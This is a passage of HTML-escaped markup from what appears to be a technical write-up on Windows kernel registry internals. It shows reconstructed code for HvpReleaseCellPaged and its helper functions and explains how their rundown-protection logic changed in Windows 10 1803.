 &lt;p class=&quot;ormwWEjHLs-c3 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;HvpGetCellContextReinitialize(Context);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;_HMAP_ENTRY&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;*HvpGetCellMap(_HHIVE&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;*Hive,&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;_HCELL_INDEX&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;CellIndex)&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;DWORD&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;StorageType&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;CellIndex&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;31;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;DWORD&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;StorageIndex&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;CellIndex&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;0x7FFFFFFF;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;(StorageIndex&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;Hive-&amp;gt;Storage[StorageType].Length)&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;&amp;amp;Hive-&amp;gt;Storage[StorageType].Map&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;-&amp;gt;Directory[(CellIndex&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;21)&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;0x3FF]&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;-&amp;gt;Table[(CellIndex&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;12)&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;0x1FF];&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;NULL;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;VOID&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;HvpMapEntryReleaseBinAddress(_HMAP_ENTRY&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;*MapEntry)&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;ExReleaseRundownProtection(&amp;amp;MapEntry-&amp;gt;TemporaryBinRundown);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;VOID&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;HvpGetCellContextReinitialize(_HV_GET_CELL_CONTEXT&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;*Context)&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;Context-&amp;gt;Cell&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;-1;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;Context-&amp;gt;Hive&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;NULL;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;p class=&quot;ormwWEjHLs-c3 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;As we can see, the main task of HvpReleaseCellPaged and its helper functions was to find the _HMAP_ENTRY structure that corresponded to a given cell index, and then potentially call the ExReleaseRundownProtection API on the _HMAP_ENTRY.TemporaryBinRunDown field.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This behavior was coordinated with the implementation of HvpGetCellPaged, which called ExAcquireRundownProtection on the same object.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;An additional side effect was that during the lookup of the _HMAP_ENTRY structure, a bounds check was performed on the cell index, and if it failed, a REGISTRY_ERROR bugcheck was triggered.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c36 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;This state of affairs persisted for about two years, until &lt;/span&gt;&lt;span&gt;Windows 10 1803 (build 17134). In that version, the code was greatly simplified: the TemporaryBinAddress and TemporaryBinRundown members were removed from _HMAP_ENTRY, and the call to ExReleaseRundownProtection was eliminated from HvpReleaseCellPaged.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This effectively meant that there was no longer any reason for this function to retrieve a pointer to the map entry (as it was not used for anything), but for some unclear reason, this logic has remained in the code to this day.&lt;/span&gt;&lt;span&gt;&amp;nbsp;In most modern kernel builds&lt;/span&gt;&lt;span&gt;, the auxiliary functions have been inlined, and HvpReleaseCellPaged now takes the following form:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;table class=&quot;ormwWEjHLs-c19&quot;&gt;&lt;tr class=&quot;ormwWEjHLs-c12&quot;&gt;&lt;td class=&quot;ormwWEjHLs-c11&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;VOID&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;HvpReleaseCellPaged(_HHIVE&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;*Hive,&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;_HV_GET_CELL_CONTEXT&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;*Context)&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;_HCELL_INDEX&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;Cell&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;Context-&amp;gt;Cell;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;DWORD&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;StorageIndex&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;Cell&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;0x7FFFFFFF;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;DWORD&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;StorageType&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;Cell&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;31;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;(StorageIndex&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;&amp;gt;=&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;Hive-&amp;gt;Storage[StorageType].Length&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;||&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;&amp;amp;Hive-&amp;gt;Storage[StorageType].Map-&amp;gt;Directory[(Cell&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;21)&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;0x3FF]-&amp;gt;Table[(Cell&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;12)&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;0x1FF]&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;==&lt;/span&gt;&lt;span 